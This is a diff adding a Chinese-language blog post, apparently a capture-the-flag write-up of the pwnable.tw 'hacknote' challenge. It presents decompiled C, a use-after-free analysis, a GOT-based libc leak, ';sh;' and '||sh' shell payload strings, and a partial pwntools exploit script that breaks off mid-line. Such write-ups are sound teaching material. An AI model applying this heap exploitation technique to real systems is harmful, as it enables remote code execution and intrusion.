@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all所以為什麼我會想來看heap…前一篇寫的筆記： https:&#x2F;&#x2F;wha13.github.io&#x2F;2024&#x2F;11&#x2F;6&#x2F;mfheap   Recon題目給了hacknote這支程式和libc，都先來檢查看看：libc版本在打heap的時候libc版本特別重要：   1strings libc_32.so.6 | grep GLIBC 2.23，基本上沒防護   checksec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hacknote on Pwnable.tw">
+<meta property="og:url" content="http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all所以為什麼我會想來看heap…前一篇寫的筆記： https:&#x2F;&#x2F;wha13.github.io&#x2F;2024&#x2F;11&#x2F;6&#x2F;mfheap   Recon題目給了hacknote這支程式和libc，都先來檢查看看：libc版本在打heap的時候libc版本特別重要：   1strings libc_32.so.6 | grep GLIBC 2.23，基本上沒防護   checksec">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/HJopYb5Z1g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1GNiZ9b1x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkmQYZcZJl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJEreG9-ye.png">
+<meta property="article:published_time" content="2024-11-07T22:10:04.000Z">
+<meta property="article:modified_time" content="2024-11-07T10:03:31.674Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="UAF">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/HJopYb5Z1g.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>hacknote on Pwnable.tw</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/06/mfheap/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&text=hacknote on Pwnable.tw"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&title=hacknote on Pwnable.tw"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&is_video=false&description=hacknote on Pwnable.tw"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=hacknote on Pwnable.tw&body=Check out this article: http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&title=hacknote on Pwnable.tw"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&title=hacknote on Pwnable.tw"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&title=hacknote on Pwnable.tw"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&title=hacknote on Pwnable.tw"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&name=hacknote on Pwnable.tw&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/11/07/pwnable-tw-hacknote/&t=hacknote on Pwnable.tw"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">2.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">3.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        hacknote on Pwnable.tw
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-07T22:10:04.000Z" class="dt-published" itemprop="datePublished">2024-11-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Pwn/" rel="tag">Pwn</a>, <a class="p-category" href="/tags/UAF/" rel="tag">UAF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>所以為什麼我會想來看heap…<br>前一篇寫的筆記： <a href="/2024/11/6/mfheap">https://wha13.github.io/2024/11/6/mfheap</a>  </p>
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>題目給了hacknote這支程式和libc，都先來檢查看看：<br><strong>libc版本</strong><br>在打heap的時候libc版本特別重要：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings libc_32.so.6 | grep GLIBC</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/HJopYb5Z1g.png" alt="image"><br>2.23，基本上沒防護  </p>
+<p><strong>checksec</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=hacknote</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/r1GNiZ9b1x.png" alt="image"><br>沒開pie，.text固定  </p>
+<p><strong>main</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-Ch] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-8h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-4h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      show_infos();</span><br><span class="line">      read(<span class="number">0</span>, v4, <span class="number">4</span>);</span><br><span class="line">      v0 = atoi(v4);</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_note_free();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v0 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>, v1, v2, v3);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v0 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      write_note_malloc();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函數名稱我有在ida另外改過，比較知道功能是什麼zzz<br><img src="https://hackmd.io/_uploads/rkmQYZcZJl.png" alt="image"><br>打開大概就是一個像這樣的選單式筆記服務  </p>
+<p><strong>write_note_malloc</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">write_note_malloc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-Ch] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-Ch] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp-8h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-8h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-4h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A04C &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_804A050[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_804A050[i] = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !dword_804A050[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>, v2, v4, v6);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)dword_804A050[i] = sub_804862B;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, v9, <span class="number">8</span>);</span><br><span class="line">        v8 = atoi(v9);</span><br><span class="line">        v0 = dword_804A050[i];</span><br><span class="line">        *(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(v8);</span><br><span class="line">        <span class="keyword">if</span> ( !*(_DWORD *)(dword_804A050[i] + <span class="number">4</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>, v3, v5, v6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *(_DWORD *)(dword_804A050[i] + <span class="number">4</span>), v8);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++dword_804A04C;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>觀察下，有個全域的array dword_804A050專門放申請的空間(8 bytes)，首先會先往它推一個 4 bytes 的 sub_804862B 函數（就是puts），接下來會在+4的地方再申請一塊記憶體(筆記大小)<br>也就是說那邊的heap結構會長這樣：<code>[4 bytes指向puts]+[4 bytes指向筆記地址]</code><br>然後最多只能有五篇筆記，也就是在tcache範圍內完成任務  </p>
+<p><strong>print_note</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-Ch] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-8h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-4h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v5, <span class="number">4</span>);</span><br><span class="line">  v4 = atoi(v5);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> || v4 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>, v1, v2, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A050[v4] )</span><br><span class="line">    (*(<span class="type">void</span> (__cdecl **)(<span class="type">int</span>))dword_804A050[v4])(dword_804A050[v4]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>它會去讀取輸入的id，取出dword_804A050對應的內容，並以該處的資料當函數呼叫，取出+4的內容作為參數處理<br>很有趣ㄅ~~<br>看到這邊大概就會感覺到之後的攻擊是要抽換呼叫的函數地址進行RCE  </p>
+<p><strong>delete_note_free</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">delete_note_free</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp-Ch] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp-8h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp-4h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v5, <span class="number">4</span>);</span><br><span class="line">  v4 = atoi(v5);</span><br><span class="line">  <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> || v4 &gt;= dword_804A04C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>, v1, v2, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_804A050[v4] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(_DWORD *)(dword_804A050[v4] + <span class="number">4</span>));</span><br><span class="line">    <span class="built_in">free</span>(dword_804A050[v4]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>會根據輸入的id去把對應的筆記地址及整個 8 bytes 的記憶體 struct free掉  </p>
+<p>想一下流程，每次新增筆記會先申請 8 bytes 的記憶體（也就是包在20 bytes的chunk裡面）<br>接著，會再去按照輸入內容大小產生特定bytes的chunk<br>那free的行為呢?<br>每次把文件刪掉都是free掉一個8 bytes的物件和剛剛特定大小的chunk，而且不清空指針有機會產生UAF，而且事實是我們可以建立一個8 bytes(或者產生20bytes大小的chunk)，這樣它在往tcachebin請求chunk的時候就會求到兩塊剛剛free進去的struct，完整寫入剛剛的struct<br>別忘記print_note，達成UAF後就是跳libc的老招術，首先透過請求got上的資料算出libc_base，最後再跳 libc 的 system 傳<code>sh</code>進去即可  </p>
+<p>嗎?<br>沒有，我卡在sh好久，最後試出<code>||sh</code>的方法，但google下全世界好像都用<code>;sh;</code>…  </p>
+<p><strong>Exp.py</strong>  </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10102</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># setup</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc_32.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># function defines</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">size, msg</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;:&#x27;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_note</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_note</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="comment">#    return r.recvline()[:-1]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit</span></span><br><span class="line">add_note(<span class="number">0x30</span>, <span class="string">b&#x27;whale&#x27;</span>)</span><br><span class="line">add_note(<span class="number">0x30</span>, <span class="string">b&#x27;meow&#x27;</span>)</span><br><span class="line">delete_note(<span class="number">0</span>)</span><br><span class="line">delete_note(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add_note(<span class="number">0x8</span>, p32(<span class="number">0x804862B</span>)+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">libc_base=u32(r.recv(<span class="number">4</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete_note(<span class="number">2</span>)</span><br><span 